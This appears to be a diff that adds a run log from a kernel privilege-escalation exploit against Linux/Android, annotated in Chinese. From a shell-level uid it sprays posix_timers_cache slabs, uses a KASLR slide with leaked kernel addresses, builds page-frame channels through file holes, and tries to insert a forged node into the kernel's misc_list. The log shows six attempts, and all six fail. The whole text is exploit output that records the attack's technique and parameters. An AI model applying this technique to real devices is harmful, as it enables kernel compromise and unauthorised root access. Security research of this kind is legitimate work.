@@ -1,0 +1,91 @@
+[ENTER] pid=19276 argc=4
+[SAFE] 已把 pid=19276 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)
+[N] norelay=1: relay_q 全部改为直写 tracefs (uid=2000)
+[PS] PURESH: 纯 shell (no relay/no kmem); stage1 insert; slide=0x23ddc80000 holes=24
+[B0c] slide=0x23ddc80000 (命令行 -s) cred_cs=0xffffffe3ede638d4 timer_cs=0xffffffe3edf3f748 task_cs=0xffffffe3ede130a8 self_tid=19276
+== wr1: pid=19276 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=64 clock=THREAD(-t) spray=pipe
+[B0a] 关键参数: thread_clock=1 file_spray=0MB attempts=6 force_hit=0 selfverify=0 execpath='/proc/self/exe' kill_us=-1
+[B0] uid=2000 euid=2000 gid=2000 egid=2000
+[B0b] PURESH: filemap add/delete 已开 (纯 shell pfn 通道)
+[B1a] probe=19279 setresgid(2000)=0 errno=1
+[B1b] 本进程 kmem_cache_alloc 记录 0 条, 最后 6 条:
+[SM] B1 leak tid=19276 cred=0 recs=0 (轮 1/0 off=0x4)
+[B1] cred: records=0 va=0 | probe_task: records=0 va=0 (tid=19276)
+[B1c] cred 记录:
+[B1c] task 记录:
+[B1] -P 绝对地址写: 跳过 probe_task 依赖 (records=0)
+[B1] 目标模式=stage1 插入 misc_list (不需要 cred 地址)
+[B6] fillers ready=6 [DECFBA]
+[R0b] 轮 1/1 t=1051199ms pid=19276 pgid=19276 sid=19276 oom=-1000 cgroup=[8:groupsched:/default]
+---- attempt 1/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=0)
+[PS] 空洞文件 ino=48433 wrote=512 add=512
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0x400 Pnode=0x418 Q=0x580 F=0x640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=1621765 node=0xffffff818bf05f58 Pnode=0xffffff818bf05418 wrv=0xffffff818bf05418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371438 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076 2047078 1621764
+[PS] victim=19286 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache    810    810    272   30    2 : tunables    0    0    0 : slabdata     27     27      0
+[ENTER] pid=19286 argc=1
+[SAFE] 已把 pid=19286 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)
+[B8] zombie=Z comm='exe' in 5222633us | ku=-1 | reads=0 opens=0 err=0 | go+-1us det+-1us kill+-1us
+   → MISS (exec 正常完成), 安全 reap 后重试
+---- attempt 2/6 ----
+[B2h] 空洞填充器 pid=19305 造了 322 个 timer (吃掉空洞)
+[B2h] 空洞填充器 pid=19308 造了 29 个 timer (吃掉空洞)
+[B2h] 填洞后 holes=0 (filler 进程=2)
+[PS] 空洞文件 ino=48433 wrote=512 add=1024
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff818bf05400 Pnode=0xffffff818bf05418 Q=0xffffff818bf05580 F=0xffffff818bf05640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=2047077 node=0xffffff81f3c65f58 Pnode=0xffffff81f3c65418 wrv=0xffffff81f3c65418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371466 1371438 1337168 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076
+[PS] victim=19323 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache   1140   1140    272   30    2 : tunables    0    0    0 : slabdata     38     38      0
+[-] slabdata 闸: slabdata=38 > 33 → 弃用该 victim, 重试
+---- attempt 3/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=2)
+[PS] 空洞文件 ino=48433 wrote=512 add=1536
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff81f3c65400 Pnode=0xffffff81f3c65418 Q=0xffffff81f3c65580 F=0xffffff81f3c65640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=2047077 node=0xffffff81f3c65f58 Pnode=0xffffff81f3c65418 wrv=0xffffff81f3c65418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371466 1371438 1337168 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076
+[PS] victim=19325 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache   1140   1140    272   30    2 : tunables    0    0    0 : slabdata     38     38      0
+[-] slabdata 闸: slabdata=38 > 33 → 弃用该 victim, 重试
+---- attempt 4/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=2)
+[PS] 空洞文件 ino=48433 wrote=512 add=2048
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff81f3c65400 Pnode=0xffffff81f3c65418 Q=0xffffff81f3c65580 F=0xffffff81f3c65640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=2047077 node=0xffffff81f3c65f58 Pnode=0xffffff81f3c65418 wrv=0xffffff81f3c65418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371466 1371438 1337168 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076
+[PS] victim=19334 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache   1140   1140    272   30    2 : tunables    0    0    0 : slabdata     38     38      0
+[-] slabdata 闸: slabdata=38 > 33 → 弃用该 victim, 重试
+---- attempt 5/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=2)
+[PS] 空洞文件 ino=48433 wrote=512 add=2560
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff81f3c65400 Pnode=0xffffff81f3c65418 Q=0xffffff81f3c65580 F=0xffffff81f3c65640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=2047077 node=0xffffff81f3c65f58 Pnode=0xffffff81f3c65418 wrv=0xffffff81f3c65418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371466 1371438 1337168 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076
+[PS] victim=19336 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache   1140   1140    272   30    2 : tunables    0    0    0 : slabdata     38     38      0
+[-] slabdata 闸: slabdata=38 > 33 → 弃用该 victim, 重试
+---- attempt 6/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=2)
+[PS] 空洞文件 ino=48433 wrote=512 add=3072
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff81f3c65400 Pnode=0xffffff81f3c65418 Q=0xffffff81f3c65580 F=0xffffff81f3c65640 misc_list=0xffffffe3f1247860 (slide=0x23ddc80000)
+[PS] 模板预置: common_pfn=2047077 node=0xffffff81f3c65f58 Pnode=0xffffff81f3c65418 wrv=0xffffff81f3c65418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 1372124 1449506 1355182 1371466 1371438 1337168 8420350 298312 298314 8468148 8468150 3431436 3431438 4168120 4168122 8460736 8460738 2619696 2619698 2588012 2588014 2047008 2047010 2047076
+[PS] victim=19342 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache   1140   1140    272   30    2 : tunables    0    0    0 : slabdata     38     38      0
+[-] slabdata 闸: slabdata=38 > 33 → 弃用该 victim, 重试
+== VERDICT: 6 次尝试全部未拿到 (hit+discard)
